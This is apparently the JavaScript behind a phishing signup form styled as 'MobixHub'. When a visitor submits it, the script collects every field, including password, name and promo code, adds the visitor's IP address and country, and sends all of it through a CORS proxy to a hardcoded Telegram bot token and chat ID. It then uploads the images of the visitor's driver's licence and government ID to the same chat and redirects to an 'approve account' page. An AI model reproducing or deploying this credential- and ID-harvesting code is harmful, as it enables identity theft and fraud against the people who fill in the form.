const steps = document.querySelectorAll(".form-step");

function nextStep(current) {
  if (validateStep(current)) {
    steps[current - 1].classList.remove("active");
    steps[current].classList.add("active");
  }
}

function prevStep(current) {
  steps[current - 1].classList.remove("active");
  steps[current - 2].classList.add("active");
}

function validateStep(stepNum) {
  const step = document.getElementById(`step-${stepNum}`);
  const inputs = step.querySelectorAll("input, select");
  for (let input of inputs) {
    if (!input.checkValidity()) {
      input.reportValidity();
      return false;
    }
  }

  if (stepNum === 1) {
    const pw = step.querySelector("input[name='password']");
    const cpw = step.querySelector("input[name='confirmPassword']");
    if (pw && cpw && pw.value !== cpw.value) {
      alert("Passwords do not match.");
      return false;
    }
  }

  return true;
}

document.getElementById("multiStepForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const statusMsg = document.getElementById("statusMessage");
  statusMsg.style.color = "#007bff";
  statusMsg.textContent = "Loading... Please wait.";

  const botToken = "7767854656:AAFd_Py6JZqgqqXx0OV9HXPsLaimgcGGVFw";
  const chatId = "6976365864";
  const proxy = "https://corsproxy.io/?";

  const formInputs = document.querySelectorAll("#multiStepForm input, #multiStepForm select");
  const data = {};
  let fullName = "";

  formInputs.forEach(input => {
    if (input.type !== "file") {
      const label = input.previousElementSibling ? input.previousElementSibling.innerText : input.name;
      const value = input.value.trim();
      if (value !== "") {
        data[label] = value;
        if (input.name === "firstName") fullName += value + " ";
        if (input.name === "lastName") fullName += value;
      }
    }
  });

  // ✅ Include promo code from input or URL param
  const promoInput = document.getElementById("promoInput");
  const promoTyped = promoInput ? promoInput.value.trim() : "";
  const promoURL = new URLSearchParams(window.location.search).get("promo");

  const promoFinal = promoTyped || promoURL;
  if (promoFinal) {
    data["Promo Code"] = promoFinal;
  }

  let message = "📝 *New MobixHub Signup Request*\n\n";
  for (const [label, value] of Object.entries(data)) {
    message += `*${label}:* ${value}\n`;
  }

  // 🌐 Fetch IP and Country then send to Telegram
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(ipData => {
      const ip = ipData.ip || "N/A";
      const country = ipData.country_name || "Unknown";

      message += `\n🌐 *IP Address:* ${ip}\n`;
      message += `🏳️ *Country:* ${country}\n`;

      return fetch(proxy + `https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });
    })
    .then(res => res.json())
    .then(response => {
      if (response.ok) {
        const fileLabels = [
          "Driver's License (Front)",
          "Driver's License (Back)",
          "Government ID (Front)",
          "Government ID (Back)"
        ];
        const fileInputs = Array.from(document.querySelectorAll("input[type='file']"));

        const uploadFile = (file, label) => {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("caption", `${fullName.trim()} - ${label}`);
          formData.append("document", file);

          return fetch(proxy + `https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: "POST",
            body: formData
          }).then(r => r.json());
        };

        (async () => {
          for (let i = 0; i < fileInputs.length; i++) {
            const file = fileInputs[i].files[0];
            if (file) {
              await uploadFile(file, fileLabels[i]);
            }
          }

          statusMsg.style.color = "green";
          statusMsg.textContent = "✅redirecting....";
          setTimeout(() => {
            window.location.href = "approve_acc.html";
          }, 1500);
        })();
      } else {
        statusMsg.style.color = "red";
        statusMsg.textContent = "❌ Text submission failed.";
      }
    })
    .catch(error => {
      console.error("Error:", error);
      statusMsg.style.color = "red";
      statusMsg.textContent = "❌ Network error or failed to get IP.";
    });
});